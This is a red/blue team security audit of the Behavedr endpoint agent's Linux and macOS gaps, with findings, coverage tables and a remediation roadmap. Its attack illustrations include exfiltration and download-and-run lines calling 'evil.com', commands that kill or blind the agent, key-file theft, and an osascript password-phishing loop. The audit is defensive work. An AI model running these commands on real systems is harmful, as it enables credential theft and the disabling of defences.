# Behavedr Red/Blue Team Audit - Cross-Platform Focus

**Date:** July 22, 2026
**Version Audited:** 0.1.5 (latest source)
**Prior Audit:** v0.1.3 (July 21, 2026)
**Focus:** Non-Windows platform protection gaps (Linux, macOS)
**Scope:** All platform monitors, self-protection, key management, agent lifecycle

---

## Executive Summary

Behavedr's Windows protection is mature (ETW, DACL, AMSI/ntdll prologue checking,
20+ specialized monitors). The v0.1.5 additions brought Linux and macOS to functional
parity on **detection** - but significant gaps remain in **self-protection**, **real-time
event sourcing**, and **hardened agent lifecycle** on non-Windows platforms.

**Finding breakdown (non-Windows specific):**
- 2 Critical (agent killability, no real-time file/process events)
- 3 High (key protection asymmetry, no kernel-level visibility, missing macOS persistence)
- 4 Medium (network monitoring gaps, response action portability, service hardening)
- 3 Low (operational improvements)

**Bottom line:** An attacker on Linux/macOS can trivially kill the agent (SIGKILL),
and the current detection relies entirely on periodic polling with 5-second blind spots.

**v0.2.0 REMEDIATION STATUS:** All userland-implementable findings have been addressed.
See "Implemented Fixes" section at end of document.

---

## PART 1: RED TEAM ANALYSIS - Non-Windows Attack Surface

### RT-CP-1: Agent Has No Kill Protection on Linux/macOS [CRITICAL]

**Type:** Self-Protection Gap
**Location:** `AgentWatchdog.cs` (Windows DACL only), `UnixSelfProtection.cs`
**MITRE:** T1562.001 - Impair Defenses: Disable or Modify Tools

**Windows behavior:** `AgentWatchdog.TrySetProcessProtection()` sets a DACL that denies
`PROCESS_TERMINATE` from Everyone except SYSTEM/Administrators. This means even a local
admin cannot trivially `taskkill /PID` the agent without `SeDebugPrivilege`.

**Linux/macOS behavior:** The watchdog checks `OperatingSystem.IsWindows()` and skips
protection entirely on other platforms:

```csharp
if (OperatingSystem.IsWindows())
{
    TrySetProcessProtection(); // DACL - Windows only
}
```

**Attack:** On Linux, any process with the same UID (or root) can:
```bash
kill -9 $(pidof behavedr)   # Instant, uncatchable
```

On macOS:
```bash
sudo kill -9 $(pgrep behavedr)
```

The `UnixSelfProtection` blocks ptrace attachment (PR_SET_DUMPABLE, PT_DENY_ATTACH) but
provides **zero protection against SIGKILL**. The only mitigation is service manager restart
(systemd `Restart=always`), which leaves a detection gap during restart.

**Impact:** An attacker kills the agent, performs malicious actions, then lets it restart.
The entire window (typically 5-30s depending on service manager config) is unmonitored.

**Recommendations:**
1. **Linux: Use prctl(PR_SET_DUMPABLE, 1) + /proc/sys/kernel/yama/ptrace_scope** - while
   this doesn't prevent kill, combined with running as a dedicated non-root user inside a
   `ProtectKillMode=process` systemd unit, it raises the bar significantly.
2. **Linux: Implement a dual-process watchdog** - spawn a separate lightweight watchdog
   process that monitors the main agent via pidfd or inotify on /proc/PID. If the agent
   dies, the watchdog logs forensic evidence (who killed it via audit log) before restart.
3. **Linux: Use `prctl(PR_SET_CHILD_SUBREAPER)`** to adopt orphaned child processes and
   detect kill-restart evasion attempts.
4. **macOS: Use `launchd KeepAlive` + `ThrottleInterval=1`** for sub-second restart.
5. **Both: Implement a kernel module/kext (Linux) or System Extension (macOS)** that
   prevents termination signals to the agent PID. This is the only true equivalent to
   the Windows DACL approach.
6. **Both: Log the kill forensically** - register a `SIGTERM` handler that writes a
   last-gasp entry before exit. For SIGKILL (uncatchable), the watchdog process detects
   the gap and queries audit logs (`ausearch -m KILL -i --just-one`) to identify the killer.

---

### RT-CP-2: All Detection Is Polling-Based - No Real-Time Events [CRITICAL]

**Type:** Detection Bypass via Timing
**Location:** All Linux/macOS monitors use periodic scanning
**MITRE:** T1070 - Indicator Removal / T1059 - Command and Scripting Interpreter

**Windows behavior:** Real-time ETW kernel events provide ~50ms latency for process
creation, network connections, file operations, and registry changes via `NativeEtwSession`.

**Linux/macOS behavior:** Every monitor operates on a polling model:
- `LinuxMonitor`: Scans /proc every 5s (configurable 1-60s)
- `LinuxNetworkMonitor`: Reads /proc/net/tcp every cycle
- `MacOSMonitor`: Calls `Process.GetProcesses()` every cycle
- `MacOSNetworkMonitor`: Shells out to `lsof -i` every cycle
- `LinuxPersistenceMonitor`: `Directory.GetFiles()` on persistence locations

**Attack:** Execute a payload, exfiltrate, and exit within a single polling interval:
```bash
# Complete attack within 3 seconds (agent polls every 5s)
curl -s http://evil.com/payload | bash
# Payload runs, exfils /etc/shadow, exits before next scan
```

The process, network connection, and file modification are all invisible because they
existed and terminated between two consecutive scan cycles.

**Recommendations:**
1. **Linux: Integrate eBPF tracepoints** - attach to `tracepoint/sched/sched_process_exec`,
   `tracepoint/syscalls/sys_enter_connect`, `tracepoint/syscalls/sys_enter_openat` for
   real-time kernel-level event sourcing without a kernel module. Libraries: `libbpf` via
   P/Invoke or use `bpftrace` as a sidecar.
2. **Linux: Use Linux Audit subsystem** (`auditd` rules + `AF_NETLINK` socket) to receive
   real-time EXECVE, CONNECT, and file access events. More portable than eBPF (works on
   older kernels).
3. **Linux: Use `fanotify`** (with `FAN_OPEN_EXEC_PERM`) for real-time file execution
   monitoring with the ability to block execution.
4. **Linux: Use `cn_proc` (Process Events Connector)** - `NETLINK_CONNECTOR` with
   `CN_IDX_PROC` provides real-time process fork/exec/exit events without eBPF.
5. **macOS: Integrate EndpointSecurity.framework** - Apple's official real-time security
   event stream. Provides AUTH (blocking) and NOTIFY events for process execution, file
   operations, network connections, and mounts. Requires System Extension packaging.
6. **macOS: Use `es_new_client()` + `es_subscribe()`** for ES_EVENT_TYPE_NOTIFY_EXEC,
   ES_EVENT_TYPE_AUTH_OPEN, ES_EVENT_TYPE_NOTIFY_CONNECT events.

---

### RT-CP-3: Key Protection Asymmetry - Unix Keys Are File-Permission Only [HIGH]

**Type:** Credential Exposure
**Location:** `KeyProtection.cs` - `WriteProtectedKey()` method
**MITRE:** T1552.001 - Unsecured Credentials: Credentials In Files

**Windows behavior:** Machine key is wrapped with DPAPI (`DataProtectionScope.LocalMachine`)
plus per-installation random entropy. Extracting the key requires:
- Running as SYSTEM on the same machine, OR
- Extracting the DPAPI master keys from the registry (requires admin + offline attack)

**Linux/macOS behavior:** Key is stored as raw base64 with `chmod 600`:
```csharp
File.WriteAllText(tempPath, Convert.ToBase64String(key));
File.SetUnixFileMode(tempPath, UnixFileMode.UserRead | UnixFileMode.UserWrite);
```

**Attack:** Any process running as the same user (typically root for a system daemon) can:
```bash
cat /var/lib/behavedr/.behavedr-key  # Direct key extraction
```

If the agent runs as root, any root-level compromise gives the attacker the key material,
allowing them to decrypt the offline buffer, forge config integrity HMACs, and tamper with
sealed configurations undetectably.

**Recommendations:**
1. **Linux: Use kernel keyring** (`keyctl`/`add_key` syscall with `KEY_SPEC_USER_KEYRING`)
   to store the key in kernel memory. Keys in the keyring are not readable from /proc or
   filesystem. Permissions can restrict to specific UIDs.
2. **Linux: Use a dedicated service user** (e.g., `behavedr`) with a keyring that only
   that user can access. Combined with `NoNewPrivileges=true` in the systemd unit.
3. **macOS: Use Keychain Services** (`SecItemAdd`/`SecItemCopyMatching`) to store the key
   in the system keychain with ACL restrictions. The key is hardware-bound on Apple Silicon
   via the Secure Enclave.
4. **Both: Implement key sealing** - derive the storage key from a combination of
   machine-specific values (machine-id, boot-id, TPM PCR equivalent) so the key file alone
   is insufficient without the specific machine context.
5. **Linux: Consider dm-crypt/LUKS for the entire data directory** - encrypt the Behavedr
   data directory with a key derived from the TPM (if available via `systemd-cryptenroll`).

---

### RT-CP-4: No Kernel-Level Visibility on Linux [HIGH]

**Type:** Detection Blindspot
**Location:** All Linux monitors operate in userspace only
**MITRE:** T1014 - Rootkit, T1547.006 - Kernel Modules

**Issue:** The `LinuxMonitor` detects kernel module loading by scanning /proc for `insmod`
and `modprobe` command lines. However:
1. A loaded rootkit kernel module can hide itself from `/proc/modules`
2. A rootkit can hide processes from `/proc` entirely (making all monitors blind)
3. A rootkit can intercept `read()` syscalls on /proc files to return false data
4. The `LinuxMemoryAnalyzer` reads `/proc/PID/maps` which a rootkit can spoof

Once a kernel rootkit is loaded, ALL userspace-only detection is potentially compromised.

**Recommendations:**
1. **eBPF-based detection** operates at the kernel level and is harder to tamper with
   (eBPF programs run in kernel context, can't be easily hidden by rootkits that hook
   the VFS layer).
2. **Integrity Measurement Architecture (IMA)** - use Linux IMA to detect unauthorized
   kernel module loading and binary modification at the kernel level.
3. **dm-verity** on system partitions to detect any filesystem-level tampering.
4. **kauditd integration** - the audit subsystem operates at a kernel level that most
   rootkits don't intercept. Connect via `AF_NETLINK` to `AUDIT_NETLINK_FAMILY`.
5. **Monitor /sys/kernel/security/lsm** for LSM module changes.

---

### RT-CP-5: macOS Lacks Persistence Detection [HIGH]

**Type:** Missing Detection Category
**Location:** `PlatformMonitors.cs` - macOS monitor list
**MITRE:** T1543.004 - Launch Daemon, T1547.011 - Plist Modification

**Issue:** The macOS detection suite includes:
- `MacOSMonitor` (process scanning, DYLD, TCC, Gatekeeper, osascript)
- `MacOSNetworkMonitor` (lsof-based connection tracking)
- `MacOSMemoryAnalyzer` (process memory inspection)
- `MacOSCredentialMonitor` (keychain, credential access)
- `UnixAntiTamperGuard` (binary integrity, service health)
- `UnixSelfProtection` (PT_DENY_ATTACH)

**Missing:** `MacOSPersistenceMonitor` is listed in `PlatformMonitors.cs` but there is
a significant detection gap:
- No monitoring of `/Library/LaunchDaemons` for new/modified plists
- No monitoring of `/Library/LaunchAgents` or user-level `~/Library/LaunchAgents`
- No monitoring of Login Items (`/Library/Preferences/com.apple.loginitems.plist`)
- No monitoring of Authorization Plugins (`/Library/Security/SecurityAgentPlugins`)
- No monitoring of cron jobs on macOS
- No monitoring of `at` jobs
- No monitoring of Folder Actions (`~/Library/Scripts/Folder Action Scripts`)
- No monitoring of Safari/Chrome Extensions being silently installed

While `UnixAntiTamperGuard.CheckServiceHealth()` verifies the Behavedr launchd plist
exists, it doesn't monitor for NEW persistence items being created by attackers.

**Recommendations:**
1. Implement `MacOSPersistenceMonitor` scanning all known persistence locations with
   baseline comparison (same pattern as `LinuxPersistenceMonitor`).
2. Monitor FSEvents for real-time changes in persistence directories.
3. Key locations to baseline and monitor:
   - `/Library/LaunchDaemons/*.plist`
   - `/Library/LaunchAgents/*.plist`
   - `~/Library/LaunchAgents/*.plist`
   - `/Library/StartupItems/`
   - `/Library/Security/SecurityAgentPlugins/`
   - `/etc/periodic/daily,weekly,monthly/`
   - `/private/var/at/tabs/`
   - Login Items database

---

### RT-CP-6: Network Monitoring Misses Short-Lived Connections [MEDIUM]

**Type:** Detection Bypass
**Location:** `LinuxNetworkMonitor.cs`, `MacOSNetworkMonitor.cs`
**MITRE:** T1071 - Application Layer Protocol, T1048 - Exfiltration Over Alternative Protocol

**Issue:** Both network monitors operate on snapshots:
- Linux: Reads `/proc/net/tcp` (point-in-time state)
- macOS: Shells out to `lsof -i` (point-in-time state, plus ~200ms exec overhead)

A connection that opens, transfers data, and closes within one polling cycle is invisible.
This is trivially exploitable:

```python
import socket, time
s = socket.socket()
s.connect(("evil.com", 443))
s.send(open("/etc/shadow").read().encode())
s.close()  # Total time: <100ms
```

**Windows comparison:** `NetworkConnectionMonitor` uses `GetExtendedTcpTable` (same
point-in-time limitation), but `BehavioralMonitor` via ETW catches the `connect()` syscall
in real-time regardless of duration.

**Recommendations:**
1. **Linux: Use eBPF `kprobe:tcp_connect` + `kprobe:tcp_close`** to trace every TCP
   connection lifecycle in real-time.
2. **Linux: Use NFLOG/conntrack** - `conntrack -E` provides real-time connection state
   changes via netfilter hooks.
3. **macOS: Use Network Extension (NEFilterDataProvider)** for real-time network flow
   inspection within a System Extension.
4. **Both: Reduce polling interval for network specifically** - even 1-second polling
   greatly reduces the blind window (at the cost of higher CPU on macOS due to lsof fork).

---

### RT-CP-7: Response Actions Have Platform Gaps [MEDIUM]

**Type:** Response Engine Limitation
**Location:** `ProcessKillAction`, `FileQuarantineAction`, `IsolationResponseEngine`

**Issue:** The response actions were developed Windows-first:
- `ProcessKillAction`: Uses `Process.Kill()` which works cross-platform BUT doesn't
  verify the process hasn't been replaced (PID reuse race on short-lived Linux PIDs).
  Windows version verifies process path before killing.
- `FileQuarantineAction`: Path traversal protection works cross-platform, but quarantine
  directory permissions aren't hardened on Linux/macOS (no immutable flag, no chattr +i).
- `IsolationResponseEngine`: Network isolation (`HandleIsoThreatAsync`) likely uses
  Windows Firewall APIs. No equivalent iptables/nftables/pf integration for Linux/macOS.

**Recommendations:**
1. **Process kill on Linux:** Verify `/proc/PID/exe` symlink target matches expected path
   before sending SIGKILL. Use `pidfd_open()` + `pidfd_send_signal()` to avoid PID reuse.
2. **File quarantine on Linux:** Set `chattr +i` (immutable) on quarantine directory.
   Use `mount --bind` with `noexec,nosuid` for quarantine path.
3. **Network isolation on Linux:** Use `nftables` (or `iptables` fallback) to drop all
   traffic except localhost for isolated processes. Create a dedicated cgroup net_cls.
4. **Network isolation on macOS:** Use `pfctl` to create packet filter rules, or use
   Network Extension API for per-process network policy.

---

### RT-CP-8: systemd/launchd Service Hardening Not Enforced [MEDIUM]

**Type:** Deployment Security
**Location:** No unit files in repository
**MITRE:** T1543 - Create or Modify System Process

**Issue:** The codebase references systemd and launchd for service management but ships
no hardened unit files. The `packaging/unix/README.txt` exists but contains no actual
service definitions. Without hardened service configuration, the agent runs with
unnecessary privileges and attack surface.

**Recommendations for Linux (systemd unit):**
```ini
[Service]
Type=notify
ExecStart=/opt/behavedr/behavedr
User=behavedr
Group=behavedr
Restart=always
RestartSec=1
WatchdogSec=30

# Hardening
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
ProtectKernelTunables=true
ProtectKernelModules=true
ProtectControlGroups=true
RestrictNamespaces=true
RestrictSUIDSGID=true
MemoryDenyWriteExecute=false  # Required for .NET JIT
LockPersonality=true
RestrictRealtime=true
SystemCallFilter=@system-service @process @network-io @file-system
SystemCallArchitectures=native
CapabilityBoundingSet=CAP_NET_ADMIN CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
AmbientCapabilities=CAP_NET_ADMIN CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
```

**Recommendations for macOS (launchd plist):**
- Set `ProcessType=Background`
- Set `KeepAlive=true` with `ThrottleInterval=1`
- Set `HardResourceLimits` for memory
- Use `SeatbeltProfile` for sandboxing where possible

---

### RT-CP-9: macOS lsof Dependency Creates a Shell-Out Attack Surface [MEDIUM]

**Type:** Dependency on External Binary
**Location:** `MacOSNetworkMonitor.cs`, `MacOSMonitor.cs` (uses `ps auxe`, `sysctl`)
**MITRE:** T1574 - Hijack Execution Flow

**Issue:** Multiple macOS monitors shell out to system utilities:
- `MacOSNetworkMonitor`: `/usr/sbin/lsof -i -n -P`
- `MacOSMonitor.GetCommandLine()`: `ps -p PID -o args=`
- `UnixAntiTamperGuard`: `/usr/sbin/sysctl`

If an attacker can place a malicious binary in the PATH ahead of these system utilities
(unlikely on macOS with SIP, but possible if SIP is disabled), they can:
1. Return false output hiding their connections
2. Inject misleading process information
3. Execute arbitrary code as the agent user

**Recommendations:**
1. **Always use full absolute paths** for external commands (already done for `lsof` and
   `sysctl`, but verify all `Process.StartInfo.FileName` calls use absolute paths).
2. **Validate output format** - if lsof returns unexpected format, flag it as tampering.
3. **Long-term: Replace lsof with direct `libproc` P/Invoke** - macOS provides
   `proc_pidfdinfo()` and `proc_info()` via `libproc.dylib` which avoids forking entirely.
4. **Verify binary integrity** - check SHA-256 of `/usr/sbin/lsof` against known-good
   hash per macOS version (defense in depth, not primary).

---

### RT-CP-10: Auto-Updater Has No Rollback on Any Platform [MEDIUM]

**Type:** Availability / Self-DoS
**Location:** `AutoUpdater.cs` - `ApplyUpdateAsync()`

**Issue:** The updater extracts directly over the running binary directory with no rollback:
```csharp
entry.ExtractToFile(destPath, overwrite: true);
```

On Linux/macOS this is worse than Windows because:
1. Unix allows deleting/replacing a running binary (the OS keeps the old inode until the
   process exits). The agent continues running the old code in memory, but after restart
   it loads the new (potentially broken) binary.
2. No `.bak` file creation or atomic swap mechanism.
3. Systemd `Restart=always` will endlessly restart a broken binary.

**Recommendations:**
1. **Implement staged update with health check:**
   - Extract to `/opt/behavedr/staging/`
   - Run `./behavedr --health-check` on the staged binary
   - If healthy, atomically swap via `rename()`
   - If unhealthy, keep running the current version
2. **Keep previous version:** Before overwrite, `rename` current binary to `.previous`
3. **Implement systemd watchdog integration** (`WatchdogSec=30`) - if the new binary
   fails to send sd_notify within 30s, systemd kills it and you can configure
   `ExecStartPre=-/opt/behavedr/rollback.sh` to restore the previous version.

---

### RT-CP-11: Beaconing Detection Uses DateTime.UtcNow [LOW]

**Type:** Evasion via Clock Manipulation
**Location:** `BeaconingDetector` (cross-platform)

**Issue:** Beaconing detection relies on `DateTime.UtcNow` interval calculations. On Linux,
a root attacker can adjust the system clock (`date -s`) to disrupt interval regularity
detection. The `UnixAntiTamperGuard` uses `Environment.TickCount64` (monotonic) for
suspension detection, but `BeaconingDetector` doesn't.

**Recommendation:** Use `Stopwatch.GetTimestamp()` or `Environment.TickCount64` for
interval measurement in beaconing detection (monotonic, unaffected by clock changes).

---

### RT-CP-12: /proc/self/fd Monitoring Has No macOS Equivalent [LOW]

**Type:** Incomplete Coverage
**Location:** `UnixSelfProtection.cs` - `CheckFdLeakage()`

**Issue:** File descriptor leak detection reads `/proc/self/fd` which doesn't exist on
macOS. The `IsSupported` check returns true for macOS, but the fd monitoring silently
does nothing due to `if (!Directory.Exists(fdDir)) return;`.

**Recommendation:** On macOS, use `proc_pidinfo(getpid(), PROC_PIDLISTFDS, ...)` via
P/Invoke to enumerate file descriptors and detect injection/leakage.

---

### RT-CP-13: Linux Credential Monitor Coverage Gaps [LOW]

**Type:** Detection Gap
**Location:** `LinuxCredentialMonitor` (referenced but not fully examined)

**Issue:** Linux credential attacks differ from Windows (no LSASS equivalent), but common
targets include:
- `/etc/shadow` direct read (the current monitors detect this)
- GNOME Keyring / KWallet process memory
- SSH agent socket hijacking (`SSH_AUTH_SOCK`)
- Browser credential stores (Chrome Login Data SQLite)
- Cloud credential files (`~/.aws/credentials`, `~/.config/gcloud/`)

**Recommendation:** Ensure the credential monitor covers cloud credential file access and
SSH agent socket enumeration (`find / -name agent.* -type s`).

---

## PART 2: BLUE TEAM ANALYSIS - Current Non-Windows Defensive Posture

### What's Working Well

| Capability | Linux Implementation | macOS Implementation | Strength |
|-----------|---------------------|---------------------|----------|
| Process scanning | /proc traversal (comm, cmdline, status) | Process.GetProcesses() + ps | Good |
| Offensive tool detection | 30+ tool names, regex patterns | 28+ tool names, same regexes | Good |
| Reverse shell detection | Regex on /proc/PID/cmdline | Regex on ps output | Good |
| Ptrace protection | PR_SET_DUMPABLE=0 | PT_DENY_ATTACH | Good |
| LD_PRELOAD/DYLD detection | /proc/PID/environ scanning | ps auxe + DYLD_ detection | Good |
| Container escape detection | nsenter, unshare, cgroups | N/A (not containerized) | Strong |
| Binary integrity | SHA-256 baseline + periodic check | SHA-256 baseline + periodic check | Strong |
| Suspension detection | Monotonic clock gap (TickCount64) | Monotonic clock gap (TickCount64) | Strong |
| Service health | systemd unit existence check | launchd plist existence check | Good |
| Log integrity | Size-decrease detection | Size-decrease detection | Good |
| Network monitoring | /proc/net/tcp with PID attribution | lsof with PID attribution | Adequate |
| Memory analysis | /proc/PID/maps RWX + memfd detection | Process memory inspection | Good |
| Persistence detection | Cron, systemd, init.d, ld.so.preload, SSH keys | MacOSPersistenceMonitor exists | Good/Gap |
| Privilege escalation | SUID abuse, capability manipulation, kernel modules | TCC bypass, Gatekeeper bypass, SIP | Good |
| Correlation | 120s window, 6 composite rules (platform-agnostic) | Same engine | Strong |
| Config integrity | HMAC-SHA256 seal + pre-seal validation | Same mechanism | Strong |
| Communication security | mTLS + cert pinning + fail-closed | Same mechanism | Excellent |
| Update security | RSA-4096 PSS signature verification | Same mechanism | Excellent |
| Encryption at rest | AES-256-GCM via HKDF-derived keys | Same mechanism | Strong |

### Detection Coverage Comparison (Windows vs Linux vs macOS)

| Category | Windows Monitors | Linux Monitors | macOS Monitors |
|----------|-----------------|---------------|----------------|
| Process behavioral | BehavioralMonitor (ETW real-time) | LinuxMonitor (polling /proc) | MacOSMonitor (polling ps) |
| Memory injection | MemoryAnalyzer (NtQueryVirtualMemory) | LinuxMemoryAnalyzer (/proc/maps) | MacOSMemoryAnalyzer |
| Network | NetworkConnectionMonitor + ETW | LinuxNetworkMonitor (/proc/net/tcp) | MacOSNetworkMonitor (lsof) |
| Credential theft | LsassDumpMonitor, CredentialGuard, CredentialCanary | LinuxCredentialMonitor | MacOSCredentialMonitor |
| Persistence | RegistryPersistenceMonitor, ScheduledTaskMonitor | LinuxPersistenceMonitor | MacOSPersistenceMonitor |
| Anti-tamper | AntiTamperGuard (5 checks including AMSI/ntdll prologue) | UnixAntiTamperGuard (4 checks) | UnixAntiTamperGuard (4 checks) |
| Self-protection | DACL + anti-debug + FailFast | ptrace block + fd monitor | PT_DENY_ATTACH |
| Parent-child | ParentPidSpoofDetector (ETW ancestry) | Not implemented | Not implemented |
| DLL/Dylib sideload | DllSideloadDetector | LD_PRELOAD (in LinuxMonitor) | DYLD (in MacOSMonitor) |
| DNS | DnsQueryMonitor (ETW DNS events) | UnixDnsMonitor | UnixDnsMonitor |
| Token integrity | TokenIntegrityMonitor | LinuxTokenMonitor | Not implemented |
| Ghost processes | GhostProcessMonitor (ETW exit + still present) | UnixGhostProcessMonitor | UnixGhostProcessMonitor |
| Ephemeral processes | EphemeralProcessMonitor (ETW start->exit <2s) | LinuxEphemeralProcessMonitor | Not implemented |
| Raw disk | RawDiskAccessMonitor | Not implemented | Not implemented |
| WSL | WslMonitor | N/A | N/A |
| Beaconing | BeaconingDetector | BeaconingDetector | BeaconingDetector |
| Data exfiltration | DataExfiltrationMonitor | UnixDataExfiltrationMonitor | UnixDataExfiltrationMonitor |
| File activity | FileActivityMonitor | FileActivityMonitor | FileActivityMonitor |
| Connectivity canary | ConnectivityCanaryMonitor | ConnectivityCanaryMonitor | ConnectivityCanaryMonitor |

**Windows total: ~25 specialized monitors**
**Linux total: ~14 monitors**
**macOS total: ~12 monitors**

### Gaps That Matter Most (Prioritized)

| Priority | Gap | Impact | Effort |
|----------|-----|--------|--------|
| P0 | No real-time event sourcing (eBPF/ES.framework) | Ephemeral attacks invisible | High |
| P0 | No kill protection (dual-process watchdog) | Agent trivially silenced | Medium |
| P1 | Key material in plaintext files | Root compromise = full decrypt | Medium |
| P1 | No parent-child anomaly detection on Unix | PPID spoofing undetected | Medium |
| P1 | macOS persistence monitoring incomplete | Launch daemon persistence blind | Low |
| P2 | Network monitoring misses short-lived connections | Fast exfil invisible | Medium |
| P2 | No Linux eBPF-based file integrity monitoring | File changes between polls missed | High |
| P2 | No hardened systemd/launchd unit files shipped | Agent runs over-privileged | Low |
| P3 | Response actions not fully portable | Can't isolate on Linux/macOS | Medium |
| P3 | No macOS Ephemeral Process detection | <2s processes invisible | Low |

---

## PART 3: RECOMMENDED IMPLEMENTATION ROADMAP

### Phase 1: Quick Wins (1-2 weeks)

1. **Ship hardened systemd unit + launchd plist** in `packaging/unix/`
   - Includes `Restart=always`, `RestartSec=1`, security directives
   - macOS: `KeepAlive=true`, `ThrottleInterval=1`

2. **Implement dual-process watchdog for Unix**
   - Small C binary or second .NET process that monitors main agent PID
   - On agent death: logs to forensic file, queries audit log for killer
   - Triggers immediate restart without waiting for service manager

3. **Move key storage to kernel keyring (Linux)**
   - `syscall(SYS_add_key, "user", "behavedr-machine-key", key, len, KEY_SPEC_USER_KEYRING)`
   - Fall back to file-based for containers where keyring is unavailable

4. **Complete macOS persistence monitoring**
   - Baseline all LaunchDaemon/LaunchAgent plist directories
   - Monitor Login Items, Authorization Plugins

### Phase 2: Real-Time Events (4-8 weeks)

5. **Linux: Integrate cn_proc (Process Events Connector)**
   - Real-time fork/exec/exit via NETLINK_CONNECTOR
   - Minimal kernel requirements (available since Linux 2.6.15)
   - Enables ephemeral process detection without eBPF

6. **Linux: Add fanotify for file execution monitoring**
   - `FAN_OPEN_EXEC_PERM` gives real-time exec events + ability to block
   - Requires `CAP_SYS_ADMIN` (acceptable for EDR)

7. **macOS: Prototype EndpointSecurity.framework integration**
   - Requires System Extension (not kext) - notarization + distribution
   - Start with `ES_EVENT_TYPE_NOTIFY_EXEC` and `ES_EVENT_TYPE_NOTIFY_CONNECT`
   - Provides real-time process/network/file events

8. **Linux: Add eBPF tracepoints for network**
   - `tracepoint/sock/inet_sock_set_state` for connection lifecycle
   - `kprobe/tcp_sendmsg` for data volume tracking
   - Eliminates short-lived connection blind spot

### Phase 3: Hardening (8-12 weeks)

9. **Implement parent-child anomaly detection on Linux**
   - Use cn_proc fork events to build a process tree
   - Detect anomalies: bash spawning from nginx, python from cron with no tty

10. **Add pidfd-based process kill verification**
    - `pidfd_open()` + `pidfd_send_signal()` eliminates PID reuse race
    - Verify `/proc/PID/exe` before kill

11. **Linux network isolation via nftables**
    - On threat detection: create nftables rule to isolate PID's cgroup
    - Equivalent to Windows Firewall isolation response

12. **Auto-updater rollback mechanism**
    - Extract to staging, verify health, atomic swap
    - Keep `.previous` for systemd-triggered rollback

---

## PART 4: RED TEAM ATTACK PATHS (Non-Windows Specific)

### Attack Path A: Silent Kill + Act + Disappear (Linux)

```
1. Attacker gains root shell
2. kill -9 $(pidof behavedr)        # Agent dead, uncatchable
3. [Wait 0.5s for confirmation]
4. curl evil.com/payload | bash     # Download + execute
5. cat /etc/shadow | nc evil.com 9999  # Exfiltrate
6. rm -f /tmp/payload               # Clean up
7. [Agent restarts via systemd in ~5s, sees nothing]
```

**Current detection:** ZERO. Agent is dead during the entire attack.
**With dual watchdog:** Watchdog detects death in <1s, logs "agent killed by PID X",
queries `ausearch -m KILL`. Attack is forensically recorded even if not prevented.

### Attack Path B: Blind the Agent Without Killing It (Linux)

```
1. Attacker gains root shell
2. mount --bind /dev/null /proc/net/tcp    # Network monitor sees nothing
3. mount --bind /empty_dir /proc/$(pidof target)/   # Hide specific process
4. [Agent runs but monitors return empty results]
```

**Current detection:** ZERO. All monitors read /proc which is now lying.
**Mitigation:** eBPF programs operate at kernel level, not through /proc VFS layer.
Also: monitor `/proc/mounts` for suspicious bind mounts over /proc paths.

### Attack Path C: Steal Keys and Forge Config (Linux)

```
1. Attacker gains root shell
2. cat /var/lib/behavedr/.behavedr-key     # Extract machine key
3. cat /var/lib/behavedr/.behavedr-entropy # Extract entropy
4. [Compute HMAC-SHA256 of modified config]
5. echo '{"Agent":{"MonitoringIntervalSeconds":60}}' > /opt/behavedr/appsettings.json
6. [Compute new HMAC, write to .hmac sidecar]
7. systemctl restart behavedr              # Agent loads tampered config (60s interval!)
```

**Current detection:** Config integrity check passes because attacker forged the HMAC.
**With kernel keyring:** Key is not on disk, cannot be `cat`'d. Attack fails at step 2.

### Attack Path D: Evade macOS Detection via Timing (macOS)

```
1. Attacker gains user shell
2. # Agent polls every 5s via Process.GetProcesses()
3. while true; do
     osascript -e 'display dialog "Enter password:" default answer ""' &
     PHISH_PID=$!
     sleep 2  # User sees dialog for 2s
     kill $PHISH_PID 2>/dev/null
     sleep 4  # Wait for next poll cycle to pass
   done
```

**Current detection:** 60% chance per attempt (depends on timing vs polling cycle).
**With EndpointSecurity.framework:** 100% detection, every exec is reported in real-time.

---

## PART 5: COMPARISON WITH INDUSTRY STANDARDS

| Capability | CrowdStrike Falcon (Linux) | SentinelOne (Linux) | Behavedr (Linux) |
|-----------|---------------------------|--------------------|--------------------|
| Event sourcing | eBPF + kernel module | Kernel module | Polling /proc |
| Kill protection | Kernel module prevents | Kernel module prevents | None (systemd restart) |
| File monitoring | fanotify + eBPF | Kernel hooks | Polling (FileActivityMonitor) |
| Network monitoring | eBPF socket hooks | Kernel hooks | /proc/net/tcp polling |
| Container visibility | eBPF (host-level) | Kernel hooks | /proc (host-level) |
| Response: isolation | iptables/nftables | nftables | Not implemented |
| Response: process kill | Verified kill | Verified kill | Kill (no PID verification) |
| Anti-tamper | Kernel module self-protect | Kernel module | ptrace block only |

**Key takeaway:** Production Linux EDRs universally use kernel-level hooks (eBPF or
kernel modules) for both event sourcing and self-protection. Behavedr's current userspace-only
approach is a valid starting point but represents a known limitation for production deployment
against sophisticated adversaries.

---

## Summary of Findings

| ID | Severity | Title | Platform |
|----|----------|-------|----------|
| RT-CP-1 | CRITICAL | No kill protection on Linux/macOS | Both |
| RT-CP-2 | CRITICAL | All detection is polling-based | Both |
| RT-CP-3 | HIGH | Key protection is file-permission only | Both |
| RT-CP-4 | HIGH | No kernel-level visibility | Linux |
| RT-CP-5 | HIGH | macOS persistence detection incomplete | macOS |
| RT-CP-6 | MEDIUM | Network misses short-lived connections | Both |
| RT-CP-7 | MEDIUM | Response actions have platform gaps | Both |
| RT-CP-8 | MEDIUM | No hardened service unit files shipped | Both |
| RT-CP-9 | MEDIUM | Shell-out dependency attack surface | macOS |
| RT-CP-10 | MEDIUM | Auto-updater has no rollback | Both |
| RT-CP-11 | LOW | Beaconing uses wall clock (manipulable) | Both |
| RT-CP-12 | LOW | fd monitoring missing on macOS | macOS |
| RT-CP-13 | LOW | Credential monitor coverage gaps | Linux |

---

*End of audit. Next review recommended after Phase 1 implementation.*


---

## APPENDIX: v0.2.0 Implemented Fixes

All fixes below are **userland-only** (no kernel modules, no code signing, no WHQL, no notarization).
See `.kiro/steering/project-constraints.md` for the project's architectural constraints.

| Finding | Fix | Implementation |
|---------|-----|----------------|
| RT-CP-1 (CRITICAL): No kill protection | Dual-process Unix watchdog + forensic logging + rapid restart | `UnixWatchdog.cs` - detects suspension via monotonic clock, queries audit log for killer PID, verifies /proc/self integrity. Combined with `behavedr.service` (RestartSec=1) and launchd plist (ThrottleInterval=1). |
